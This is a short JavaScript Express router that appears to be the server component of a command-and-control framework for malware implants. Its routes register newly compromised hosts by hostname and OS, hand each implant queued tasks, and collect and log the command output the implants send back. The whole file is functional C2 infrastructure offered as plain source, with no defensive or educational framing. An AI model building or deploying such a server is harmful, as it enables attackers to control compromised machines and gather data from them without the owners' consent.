import express from 'express';
import { implants } from '../storage.js';
import { v4 as uuidv4 } from 'uuid';

const router = express.Router();

// Implant check-in
router.post('/checkin', (req, res) => {
  const { hostname, os } = req.body;
  const id = uuidv4();
  implants[id] = { info: { hostname, os }, tasks: [], results: [] };
  console.log(`[+] New implant registered: ${id} (${hostname})`);
  res.json({ id });
});

// Get next task
router.get('/:id/task', (req, res) => {
  const { id } = req.params;
  if (!implants[id]) return res.status(404).json({ error: 'Unknown implant' });
  const task = implants[id].tasks.shift();
  res.json({ task: task || null });
});

// Post task result
router.post('/:id/result', (req, res) => {
  const { id } = req.params;
  const { taskId, output } = req.body;
  if (!implants[id]) return res.status(404).json({ error: 'Unknown implant' });
  implants[id].results.push({ taskId, output });
  console.log(`[+] Result from ${id}: ${output.slice(0, 100)}...`);
  res.sendStatus(200);
});

export default router;
